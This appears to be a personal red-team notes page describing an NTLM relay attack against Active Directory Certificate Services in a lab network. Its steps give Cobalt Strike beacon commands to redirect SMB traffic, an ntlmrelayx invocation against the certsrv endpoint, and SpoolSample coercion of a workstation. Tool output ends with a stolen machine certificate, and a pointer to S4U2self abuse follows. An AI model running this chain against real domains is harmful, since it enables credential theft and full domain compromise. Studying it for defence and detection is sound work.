# NTLM Relaying to ADCS
AD CS services support HTTP enrolment methods via `http[s]://<host>/certsrv`, and by default supports `NTLM` and `Negotiate` authentication methods.
 ![](/Images/Pasted%20image%2020220316233059.png)

By default, these endpoints can be misused for an NTLM relaying attack.
The idea is:
1. Domain controller authenticates to an attacker-controller location
2. Relay that request to the CA and obtain a certificate for that DC
3. Use it to obtain a TGT.

⚠️ You cannot relay authentication back to the original machine. 
If the CA is also on the DC you cannot request a certificate for dc-1.
Instead, we'll use WKSTN3 as an example.

Setup:
* 10.10.5.10 is DC-1
* 10.10.5.20 is SRV1
* 10.10.5.30 is WKSTN3

As SYSTEM on SRV1:
1. Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.
2. Start a reverse port forward to forward port 8445 to the CS server on port 445.
3.  Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.
    ```beacon
    beacon> PortBender redirect 445 8445
    [+] Launching PortBender module using reflective DLL injection
    
    Initializing PortBender in redirector mode
    Configuring redirection of connections targeting 445/TCP to 8445/TCP

    beacon> rportfwd 8445 127.0.0.1 445
    [+] started reverse port forward on 8445 to 127.0.0.1:445

    beacon> socks 1080
    [+] started SOCKS4a server on: 1080
    ```

4. Start ntlmrelayx over proxychains and target dc-1:
    ```sh
    proxychains ntlmrelayx.py -t http://10.10.5.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
    ```

5. Force a connection from WKSTN3 to SRV1.
    ```beacon
    beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.5.30 10.10.5.20

    [+] Converted DLL to shellcode
    [+] Executing RDI
    [+] Calling exported function
    ```

6. We see the connection in the Beacon running PortBender.
    ```beacon
    [+] received output:
    New connection from 10.10.5.30:53666 to 10.10.5.20:445
    Disconnect from 10.10.5.30:53666 to 10.10.5.20:445
    ```

7. We receive a base64 encoded ticket.
    ```sh
    [*] SMBD-Thread-4: Connection from EDU/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.5.10
    [*] HTTP server returned error code 200, treating as a successful login
    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED
    [*] Generating CSR...
    [*] CSR generated!
    [*] Getting certificate...
    ...  OK
    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED
    [*] SMBD-Thread-4: Connection from EDU/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.5.10
    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED
    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED
    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED
    [*] GOT CERTIFICATE! ID 5
    [*] Base64 certificate of user WKSTN-3$:
    MBCQ4Y[...snip...]Mndq==
    ```

8. Use [[S4U2self Abuse#Obtain a TGS to itself]] to obtain a TGS for any service on the machine, on behalf of any user. 


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```